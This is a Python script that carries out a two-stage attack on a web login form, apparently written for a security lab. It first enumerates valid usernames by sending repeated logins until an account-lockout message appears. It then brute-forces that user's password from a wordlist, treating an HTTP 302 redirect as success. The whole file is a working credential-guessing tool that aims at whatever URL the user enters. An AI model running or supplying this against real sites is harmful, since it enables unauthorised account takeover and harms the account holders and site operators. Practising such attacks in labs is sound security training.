import requests
import time

# Function to send a login request and return the response
def send_login_request(url, username, password):
    data = {
        'username': username,
        'password': password
    }
    try:
        response = requests.post(url, data=data)
        return response
    except requests.RequestException as e:
        print(f"Error during login request: {e}")
        return None

# Function for Cluster Bomb attack to identify locked username
def cluster_bomb_attack(url, username_list, null_payloads_count=5):
    print("Starting Cluster Bomb attack...")
    results = {}
    
    for username in username_list:
        payloads = [username] * null_payloads_count
        for payload in payloads:
            response = send_login_request(url, username, payload)
            if response is not None:
                status_code = response.status_code
                content = response.text
                # Store results based on response content
                results[(username, payload)] = (status_code, content)
                time.sleep(1)  # Avoid sending too many requests too quickly

    # Find the username with the account lock error message
    locked_usernames = [username for (username, _), (_, content) in results.items() if "You have made too many incorrect login attempts" in content]
    
    if locked_usernames:
        print(f"Locked username found: {locked_usernames[0]}")
        return locked_usernames[0]
    else:
        print("No locked username found.")
        return None

# Function for Sniper attack to find the correct password
def sniper_attack(url, locked_username, password_list):
    print(f"Starting Sniper attack for username: {locked_username}...")
    
    for password in password_list:
        response = send_login_request(url, locked_username, password)
        if response is not None:
            status_code = response.status_code
            content = response.text
            # Check for success or failure messages
            if status_code == 200:
                print(f"Login attempt with password '{password}' succeeded.")
            elif status_code == 302:
                print(f"Password found for username '{locked_username}': {password}")
                return password
            elif status_code == 403:
                print(f"Login attempt with password '{password}' failed.")
            else:
                print(f"Unexpected response for password '{password}': Status Code {status_code}")

    print("No valid password found.")
    return None

if __name__ == "__main__":
    # Get input from the user
    url = input("Enter the login URL (e.g., http://target.com/login): ").strip()
    username_list_path = input("Enter the path to the username list file: ").strip()
    password_list_path = input("Enter the path to the password list file: ").strip()

    # Read usernames and passwords from files
    try:
        with open(username_list_path, 'r') as file:
            username_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Username file not found.")
        exit(1)

    try:
        with open(password_list_path, 'r') as file:
            password_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Password file not found.")
        exit(1)

    # Perform the Cluster Bomb attack to identify a locked username
    locked_username = cluster_bomb_attack(url, username_list)

    if locked_username:
        # Perform the Sniper attack to find the correct password
        sniper_attack(url, locked_username, password_list)
